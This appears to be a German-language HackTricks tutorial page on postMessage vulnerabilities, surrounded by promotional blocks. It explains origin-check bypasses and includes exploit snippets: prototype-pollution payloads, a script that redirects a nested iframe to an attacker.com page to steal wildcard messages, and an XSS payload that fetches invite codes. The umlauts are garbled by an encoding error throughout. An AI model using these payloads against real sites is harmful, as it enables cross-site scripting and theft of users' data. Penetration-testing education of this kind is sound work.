# PostMessage-Schwachstellen

## PostMessage-Schwachstellen

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware**n **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool kostenlos ausprobieren unter:

{% embed url="https://whiteintel.io" %}

---

## Sende **PostMessage**

**PostMessage** verwendet die folgende Funktion zum Senden einer Nachricht:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachten Sie, dass **targetOrigin** ein '\*' oder eine URL wie _https://company.com_ sein kann. Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn der Ursprung des Fensterobjekts unterschiedlich ist). Wenn das **Wildcard** verwendet wird, k√∂nnen **Nachrichten an jede Domain gesendet werden** und werden an den Ursprung des Fensterobjekts gesendet.

### Angriff auf iframe & Wildcard in **targetOrigin**

Wie in [**diesem Bericht**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erkl√§rt, wenn Sie eine Seite finden, die **iframed** werden kann (kein `X-Frame-Header`-Schutz) und die sensible Nachrichten √ºber **postMessage** mit einem **Wildcard** (\*) sendet, k√∂nnen Sie den **Ursprung** des **iframe** √§ndern und die **sensible** Nachricht an eine von Ihnen kontrollierte Domain **leaken**. Beachten Sie, dass wenn die Seite iframed werden kann, aber das **targetOrigin** auf eine URL und nicht auf ein Wildcard gesetzt ist, dieser **Trick nicht funktioniert**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener Ausnutzung

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages`** erwartet.\
Ein Code √§hnlich dem folgenden wird verwendet:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### Enumeration

Um **Event-Listener** auf der aktuellen Seite zu **finden**, k√∂nnen Sie:

- Die JS-Code nach `window.addEventListener` und `$(window).on` (_JQuery-Version_) durchsuchen
- Im Konsolenfenster der Entwicklertools ausf√ºhren: `getEventListeners(window)`
- Zu _Elements --> Event Listeners_ in den Entwicklertools des Browsers gehen
- Eine Browsererweiterung wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) verwenden. Diese Browsererweiterungen werden alle Nachrichten abfangen und anzeigen.

### Origin-√úberpr√ºfung umgehen

- Das Attribut **`event.isTrusted`** gilt als sicher, da es nur f√ºr Ereignisse `True` zur√ºckgibt, die durch echte Benutzeraktionen generiert werden. Obwohl es herausfordernd ist, wenn es korrekt implementiert ist, ist seine Bedeutung bei Sicherheits√ºberpr√ºfungen bemerkenswert.
- Die Verwendung von **`indexOf()`** zur Ursprungsvalidierung in PostMessage-Ereignissen kann anf√§llig f√ºr Umgehungen sein.
- Die **`search()`**-Methode von `String.prototype.search()` ist f√ºr regul√§re Ausdr√ºcke gedacht, nicht f√ºr Zeichenfolgen. Das Weitergeben von etwas anderem als einem regul√§ren Ausdruck f√ºhrt zu einer impliziten Konvertierung in einen regul√§ren Ausdruck, was die Methode potenziell unsicher macht.
- Die Funktion **`match()`**, √§hnlich wie `search()`, verarbeitet regul√§re Ausdr√ºcke. Wenn der regul√§re Ausdruck falsch strukturiert ist, k√∂nnte er anf√§llig f√ºr Umgehungen sein.
- Die Funktion **`escapeHtml`** ist dazu gedacht, Eingaben zu bereinigen, indem Zeichen maskiert werden. Dieses Verhalten kann ausgenutzt werden.

### e.origin == window.origin umgehen

Beim Einbetten einer Webseite in ein **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass der Ursprung des iframes auf null gesetzt wird. Dies ist besonders wichtig im Umgang mit **Sandbox-Attributen** und deren Auswirkungen auf Sicherheit und Funktionalit√§t.

Durch die Angabe von **`allow-popups`** im Sandbox-Attribut erbt jedes Popup-Fenster, das aus dem iframe ge√∂ffnet wird, die Sandbox-Beschr√§nkungen seines √ºbergeordneten Elements. Dies bedeutet, dass, es sei denn, das Attribut **`allow-popups-to-escape-sandbox`** ebenfalls enthalten ist, der Ursprung des Popup-Fensters ebenfalls auf `null` gesetzt wird, was mit dem Ursprung des iframes √ºbereinstimmt.

Folglich, wenn unter diesen Bedingungen ein Popup ge√∂ffnet wird und eine Nachricht vom iframe an das Popup mit **`postMessage`** gesendet wird, haben sowohl der sendende als auch der empfangende Teil ihren Ursprung auf `null` gesetzt. Dies f√ºhrt zu einer Situation, in der **`e.origin == window.origin`** als wahr ausgewertet wird (`null == null`), da sowohl das iframe als auch das Popup den gleichen Ursprungswert von `null` teilen.

F√ºr weitere Informationen **lesen Sie**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Umgehen von e.source

Es ist m√∂glich zu √ºberpr√ºfen, ob die Nachricht aus demselben Fenster stammt, in dem das Skript lauscht (besonders interessant f√ºr **Content Scripts von Browsererweiterungen**, um zu √ºberpr√ºfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Sie k√∂nnen erzwingen, dass **`e.source`** einer Nachricht null ist, indem Sie ein **iframe** erstellen, das die **postMessage** sendet und **sofort gel√∂scht** wird.

F√ºr weitere Informationen **lesen Sie:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header Umgehung

Um diese Angriffe durchzuf√ºhren, sollten Sie idealerweise die **Webseite des Opfers** in einem `iframe` platzieren k√∂nnen. Aber einige Header wie `X-Frame-Header` k√∂nnen **dieses Verhalten** **verhindern**.\
In solchen Szenarien k√∂nnen Sie dennoch einen weniger unauff√§lligen Angriff durchf√ºhren. Sie k√∂nnen einen neuen Tab zur verwundbaren Webanwendung √∂ffnen und mit ihr kommunizieren:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stehlen von Nachrichten, die an ein Kind gesendet wurden, indem die Hauptseite blockiert wird

Auf der folgenden Seite k√∂nnen Sie sehen, wie Sie sensible **postMessage-Daten**, die an ein **Child-Iframe** gesendet wurden, stehlen k√∂nnen, indem Sie die **Hauptseite blockieren**, bevor die Daten gesendet werden, und einen **XSS im Child** ausnutzen, um die Daten zu **leaken**, bevor sie empfangen werden:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Stehlen von Nachrichten durch √Ñndern des Iframe-Standorts

Wenn Sie eine Webseite ohne X-Frame-Header in ein Iframe einbetten k√∂nnen, das ein anderes Iframe enth√§lt, k√∂nnen Sie den **Standort dieses Child-Iframes √§ndern**, sodass, wenn es eine **postMessage** empf√§ngt, die mit einem **Wildcard** gesendet wurde, ein Angreifer den **Ursprung** dieses Iframes zu einer von ihm **kontrollierten** Seite **√§ndern** und die Nachricht **stehlen** k√∂nnte:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die √ºber `postMessage` gesendeten Daten von JS ausgef√ºhrt werden, k√∂nnen Sie die **Seite in ein Iframe einbetten** und die **Prototype Pollution/XSS** ausnutzen, indem Sie den Exploit √ºber `postMessage` senden.

Ein paar **sehr gut erkl√§rte XSS √ºber `postMessage`** finden Sie unter [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Beispiel f√ºr einen Exploit zur Ausnutzung von **Prototype Pollution und dann XSS** √ºber eine `postMessage` an ein `Iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
F√ºr **weitere Informationen**:

* Link zur Seite √ºber [**Prototyp-Verschmutzung**](../deserialization/nodejs-proto-prototype-pollution/)
* Link zur Seite √ºber [**XSS**](../xss-cross-site-scripting/)
* Link zur Seite √ºber [**Client-seitige Prototyp-Verschmutzung zu XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referenzen

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Zum √úben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware**n **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
